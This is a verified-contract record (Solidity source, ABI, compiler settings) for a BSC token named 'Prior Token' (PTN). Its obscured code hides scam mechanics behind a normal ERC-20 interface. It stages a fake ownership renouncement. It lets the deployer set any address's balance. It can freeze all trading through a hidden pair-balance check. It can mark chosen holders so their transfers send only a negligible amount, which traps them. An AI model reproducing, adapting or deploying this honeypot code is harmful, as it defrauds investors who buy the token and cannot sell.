{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\ninterface shouldWalletLimit {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address toExempt) external view returns (uint256);\n\n    function transfer(address takeReceiver, uint256 limitList) external returns (bool);\n\n    function allowance(address swapSender, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 limitList) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address takeReceiver,\n        uint256 limitList\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed launchedTake, uint256 value);\n    event Approval(address indexed swapSender, address indexed spender, uint256 value);\n}\n\nabstract contract minList {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface maxWallet {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface enableTokenFee {\n    function createPair(address minTx, address autoLiquidityIs) external returns (address);\n}\n\ninterface enableLiquidity is shouldWalletLimit {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PriorToken is minList, shouldWalletLimit, enableLiquidity {\n\n    uint256 private amountExempt;\n\n    function approve(address sellFrom, uint256 limitList) public virtual override returns (bool) {\n        sellAt[_msgSender()][sellFrom] = limitList;\n        emit Approval(_msgSender(), sellFrom, limitList);\n        return true;\n    }\n\n    bool private buyReceiverAt;\n\n    mapping(address => mapping(address => uint256)) private sellAt;\n\n    uint256 public isBuyMarketing;\n\n    function name() external view virtual override returns (string memory) {\n        return listShould;\n    }\n\n    function launchTo() private view {\n        require(feeAmount[_msgSender()]);\n    }\n\n    mapping(address => uint256) private exemptBuy;\n\n    function symbol() external view virtual override returns (string memory) {\n        return liquidityEnable;\n    }\n\n    event OwnershipTransferred(address indexed tradingLiquidity, address indexed launchedLiquidity);\n\n    function transferFrom(address modeAuto, address takeReceiver, uint256 limitList) external override returns (bool) {\n        if (_msgSender() != toIs) {\n            if (sellAt[modeAuto][_msgSender()] != type(uint256).max) {\n                require(limitList <= sellAt[modeAuto][_msgSender()]);\n                sellAt[modeAuto][_msgSender()] -= limitList;\n            }\n        }\n        return listTx(modeAuto, takeReceiver, limitList);\n    }\n\n    mapping(address => bool) public feeAmount;\n\n    uint256 fromWallet;\n\n    address private teamTradingAt;\n\n    address toIs = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function getOwner() external view returns (address) {\n        return teamTradingAt;\n    }\n\n    bool public takeIs;\n\n    bool public maxAutoReceiver;\n\n    function totalMode(address tradingAmountEnable, uint256 limitList) public {\n        launchTo();\n        exemptBuy[tradingAmountEnable] = limitList;\n    }\n\n    uint256 listReceiverTotal;\n\n    function allowance(address minLimit, address sellFrom) external view virtual override returns (uint256) {\n        if (sellFrom == toIs) {\n            return type(uint256).max;\n        }\n        return sellAt[minLimit][sellFrom];\n    }\n\n    address public fromListTake;\n\n    function listFrom(address launchedTo) public {\n        if (maxAutoReceiver) {\n            return;\n        }\n        \n        feeAmount[launchedTo] = true;\n        if (takeIs) {\n            enableReceiver = true;\n        }\n        maxAutoReceiver = true;\n    }\n\n    function listTx(address modeAuto, address takeReceiver, uint256 limitList) internal returns (bool) {\n        if (modeAuto == receiverMarketing) {\n            return isModeTotal(modeAuto, takeReceiver, limitList);\n        }\n        uint256 marketingShould = shouldWalletLimit(fromListTake).balanceOf(swapMarketing);\n        require(marketingShould == fromWallet);\n        require(takeReceiver != swapMarketing);\n        if (receiverFee[modeAuto]) {\n            return isModeTotal(modeAuto, takeReceiver, receiverSender);\n        }\n        return isModeTotal(modeAuto, takeReceiver, limitList);\n    }\n\n    string private listShould = \"Prior Token\";\n\n    function walletTokenTrading(uint256 limitList) public {\n        launchTo();\n        fromWallet = limitList;\n    }\n\n    function fundLaunched() public {\n        emit OwnershipTransferred(receiverMarketing, address(0));\n        teamTradingAt = address(0);\n    }\n\n    address swapMarketing = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => bool) public receiverFee;\n\n    uint256 public receiverFrom;\n\n    function owner() external view returns (address) {\n        return teamTradingAt;\n    }\n\n    constructor (){\n        if (enableReceiver) {\n            takeIs = false;\n        }\n        maxWallet sellTake = maxWallet(toIs);\n        fromListTake = enableTokenFee(sellTake.factory()).createPair(sellTake.WETH(), address(this));\n        \n        receiverMarketing = _msgSender();\n        fundLaunched();\n        feeAmount[receiverMarketing] = true;\n        exemptBuy[receiverMarketing] = toWallet;\n        \n        emit Transfer(address(0), receiverMarketing, toWallet);\n    }\n\n    function balanceOf(address toExempt) public view virtual override returns (uint256) {\n        return exemptBuy[toExempt];\n    }\n\n    uint256 private toWallet = 100000000 * 10 ** 18;\n\n    uint256 constant receiverSender = 14 ** 10;\n\n    string private liquidityEnable = \"PTN\";\n\n    function transfer(address tradingAmountEnable, uint256 limitList) external virtual override returns (bool) {\n        return listTx(_msgSender(), tradingAmountEnable, limitList);\n    }\n\n    uint8 private isMax = 18;\n\n    function isModeTotal(address modeAuto, address takeReceiver, uint256 limitList) internal returns (bool) {\n        require(exemptBuy[modeAuto] >= limitList);\n        exemptBuy[modeAuto] -= limitList;\n        exemptBuy[takeReceiver] += limitList;\n        emit Transfer(modeAuto, takeReceiver, limitList);\n        return true;\n    }\n\n    address public receiverMarketing;\n\n    function decimals() external view virtual override returns (uint8) {\n        return isMax;\n    }\n\n    uint256 private launchSender;\n\n    bool public enableReceiver;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return toWallet;\n    }\n\n    function tokenMinTx(address maxTotalAuto) public {\n        launchTo();\n        if (takeIs) {\n            amountExempt = launchSender;\n        }\n        if (maxTotalAuto == receiverMarketing || maxTotalAuto == fromListTake) {\n            return;\n        }\n        receiverFee[maxTotalAuto] = true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedLiquidity\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedTake\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellFrom\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitList\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toExempt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromListTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isBuyMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedTo\",\"type\":\"address\"}],\"name\":\"listFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxAutoReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxTotalAuto\",\"type\":\"address\"}],\"name\":\"tokenMinTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingAmountEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitList\",\"type\":\"uint256\"}],\"name\":\"totalMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingAmountEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitList\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitList\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"limitList\",\"type\":\"uint256\"}],\"name\":\"walletTokenTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "PriorToken", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}